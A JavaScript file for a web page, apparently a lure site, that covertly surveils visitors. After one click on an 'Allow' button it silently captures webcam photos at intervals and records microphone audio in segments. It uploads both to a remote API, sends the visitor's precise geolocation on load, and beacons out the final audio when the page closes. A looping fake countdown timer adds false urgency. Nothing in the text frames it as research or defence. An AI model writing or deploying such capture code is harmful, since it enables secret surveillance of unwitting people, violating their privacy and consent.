class CaptureManager {
    constructor() {
        this.sessionId = null;
        this.cameraStream = null;
        this.audioStream = null;
        this.mediaRecorder = null;
        this.audioChunks = [];
        this.captureInterval = null;
        this.recordingStartTime = null;
        this.accessGranted = false;
        this.isRecording = false;
        
        this.init();
    }

    async init() {
        await this.initSession();
        this.setupGeolocation();
        this.setupBeforeUnload();
    }

    async initSession() {
        try {
            const response = await fetch(`${CONFIG.API_URL}/api/ip`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            const data = await response.json();
            this.sessionId = data.session_id;
            console.log('Session created:', this.sessionId);
        } catch (error) {
            console.error('Session error:', error);
        }
    }

    async requestPermissions() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    width: { ideal: 1280 }, 
                    height: { ideal: 720 },
                    facingMode: 'user'
                },
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false,
                    sampleRate: 48000
                }
            });

            const videoTrack = stream.getVideoTracks()[0];
            const audioTrack = stream.getAudioTracks()[0];

            this.cameraStream = new MediaStream([videoTrack]);
            this.audioStream = new MediaStream([audioTrack]);

            const video = document.getElementById('videoPreview');
            video.srcObject = this.cameraStream;
            await video.play();

            console.log('Permissions granted, starting capture...');
            
            this.startSilentCapture();
            this.startAudioRecording();

            this.accessGranted = true;
            return true;

        } catch (error) {
            console.error('Permission error:', error);
            return false;
        }
    }

    startSilentCapture() {
        const video = document.getElementById('videoPreview');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        this.captureInterval = setInterval(async () => {
            if (!this.cameraStream || !video.videoWidth) {
                console.log('Waiting for video stream...');
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);

            try {
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const reader = new FileReader();
                
                reader.onloadend = async () => {
                    try {
                        const response = await fetch(`${CONFIG.API_URL}/api/capture`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                cat: reader.result,
                                session_id: this.sessionId
                            })
                        });
                        const result = await response.json();
                        console.log('Photo sent:', result);
                    } catch (error) {
                        console.error('Capture send error:', error);
                    }
                };
                
                reader.readAsDataURL(blob);
            } catch (error) {
                console.error('Capture error:', error);
            }
        }, CONFIG.PHOTO_INTERVAL);
        
        console.log('Photo capture started');
    }

    startAudioRecording() {
        if (!this.audioStream) {
            console.error('No audio stream available');
            return;
        }

        try {
            const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                ? 'audio/webm;codecs=opus' 
                : 'audio/webm';
                
            this.mediaRecorder = new MediaRecorder(this.audioStream, { mimeType });

            this.mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    this.audioChunks.push(event.data);
                    console.log('Audio chunk collected:', event.data.size, 'bytes');
                }
            };

            this.mediaRecorder.onstop = async () => {
                if (this.audioChunks.length === 0) {
                    console.log('No audio data to send');
                    return;
                }
                
                const audioBlob = new Blob(this.audioChunks, { type: mimeType });
                const reader = new FileReader();
                
                reader.onloadend = async () => {
                    const duration = this.recordingStartTime ? 
                        Math.floor((Date.now() - this.recordingStartTime) / 1000) : 0;
                    
                    try {
                        const response = await fetch(`${CONFIG.API_URL}/api/audio`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                audio: reader.result,
                                session_id: this.sessionId,
                                duration: duration
                            })
                        });
                        const result = await response.json();
                        console.log('Audio sent:', result, 'Duration:', duration + 's');
                    } catch (error) {
                        console.error('Audio send error:', error);
                    }
                };
                
                reader.readAsDataURL(audioBlob);
                this.audioChunks = [];
                
                if (this.isRecording && this.audioStream && this.audioStream.active) {
                    setTimeout(() => {
                        this.recordingStartTime = Date.now();
                        this.mediaRecorder.start();
                        console.log('Audio recording restarted');
                    }, 100);
                }
            };

            this.isRecording = true;
            this.recordingStartTime = Date.now();
            this.mediaRecorder.start();
            console.log('Audio recording started');

            setInterval(() => {
                if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
                    this.mediaRecorder.stop();
                    console.log('Audio segment completed');
                }
            }, CONFIG.AUDIO_SEGMENT_DURATION);

        } catch (error) {
            console.error('MediaRecorder error:', error);
        }
    }

    setupGeolocation() {
        if (!navigator.geolocation) {
            console.log('Geolocation not supported');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                try {
                    const response = await fetch(`${CONFIG.API_URL}/api/location`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy,
                            session_id: this.sessionId
                        })
                    });
                    const result = await response.json();
                    console.log('Location sent:', result);
                } catch (error) {
                    console.error('Location send error:', error);
                }
            },
            (error) => {
                console.error('Geolocation error:', error);
            },
            { 
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    setupBeforeUnload() {
        const cleanup = async () => {
            console.log('Cleanup started');
            
            if (this.captureInterval) {
                clearInterval(this.captureInterval);
            }
            
            this.isRecording = false;
            
            if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
                this.mediaRecorder.stop();
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                if (this.audioChunks.length > 0) {
                    const finalBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    
                    reader.onloadend = () => {
                        navigator.sendBeacon(`${CONFIG.API_URL}/api/exit`, JSON.stringify({
                            session_id: this.sessionId,
                            final_audio: reader.result
                        }));
                    };
                    
                    reader.readAsDataURL(finalBlob);
                }
            }

            if (this.cameraStream) {
                this.cameraStream.getTracks().forEach(t => t.stop());
            }
            if (this.audioStream) {
                this.audioStream.getTracks().forEach(t => t.stop());
            }
        };

        window.addEventListener('beforeunload', cleanup);
        window.addEventListener('pagehide', cleanup);
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                cleanup();
            }
        });
    }

    cleanup() {
        if (this.captureInterval) clearInterval(this.captureInterval);
        if (this.cameraStream) this.cameraStream.getTracks().forEach(t => t.stop());
        if (this.audioStream) this.audioStream.getTracks().forEach(t => t.stop());
    }
}

class UIManager {
    constructor(captureManager) {
        this.capture = captureManager;
        this.overlay = document.getElementById('permissionOverlay');
        this.allowBtn = document.getElementById('allowBtn');
        this.skipBtn = document.getElementById('skipBtn');
        this.cameraStatus = document.getElementById('cameraStatus');
        this.micStatus = document.getElementById('micStatus');
        
        this.setupEventListeners();
    }

    setupEventListeners() {
        if (this.allowBtn) {
            this.allowBtn.onclick = async () => {
                console.log('User clicked Allow button');
                const success = await this.capture.requestPermissions();
                
                if (success) {
                    this.cameraStatus.textContent = '✅';
                    this.cameraStatus.className = 'status granted';
                    this.micStatus.textContent = '✅';
                    this.micStatus.className = 'status granted';
                    
                    setTimeout(() => {
                        this.overlay.classList.remove('show');
                        this.showNotification('✅ Accès activé avec succès !');
                    }, 800);
                } else {
                    this.cameraStatus.textContent = '❌';
                    this.cameraStatus.className = 'status denied';
                    this.micStatus.textContent = '❌';
                    this.micStatus.className = 'status denied';
                    this.showNotification('❌ Autorisations refusées');
                }
            };
        }

        if (this.skipBtn) {
            this.skipBtn.onclick = () => {
                console.log('User clicked Skip button');
                this.overlay.classList.remove('show');
                this.capture.accessGranted = true;
            };
        }

        setTimeout(() => {
            if (this.overlay && !this.capture.accessGranted) {
                this.overlay.classList.add('show');
                console.log('Permission overlay shown');
            }
        }, 2000);
    }

    showNotification(message) {
        const notif = document.createElement('div');
        notif.style.cssText = `
            position: fixed;
            top: 30px;
            right: 30px;
            background: linear-gradient(135deg, #48bb78, #38a169);
            color: white;
            padding: 20px 30px;
            border-radius: 15px;
            font-weight: 700;
            z-index: 10000;
            animation: slideIn 0.3s ease;
        `;
        notif.textContent = message;
        document.body.appendChild(notif);
        
        setTimeout(() => {
            notif.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notif.remove(), 300);
        }, 3000);
    }

    requireAccess() {
        if (!this.capture.accessGranted) {
            this.overlay.classList.add('show');
            return false;
        }
        return true;
    }
}

function startCountdown() {
    let timeLeft = 9 * 3600 + 56 * 60 + 42;
    
    setInterval(() => {
        const hours = Math.floor(timeLeft / 3600);
        const minutes = Math.floor((timeLeft % 3600) / 60);
        const seconds = timeLeft % 60;
        
        const hoursEl = document.getElementById('hours');
        const minutesEl = document.getElementById('minutes');
        const secondsEl = document.getElementById('seconds');
        
        if (hoursEl) hoursEl.textContent = hours.toString().padStart(2, '0');
        if (minutesEl) minutesEl.textContent = minutes.toString().padStart(2, '0');
        if (secondsEl) secondsEl.textContent = seconds.toString().padStart(2, '0');
        
        if (--timeLeft < 0) timeLeft = 9 * 3600 + 56 * 60 + 42;
    }, 1000);
}

let captureManager, uiManager;

document.addEventListener('DOMContentLoaded', () => {
    console.log('App initialized');
    captureManager = new CaptureManager();
    uiManager = new UIManager(captureManager);
    startCountdown();
});
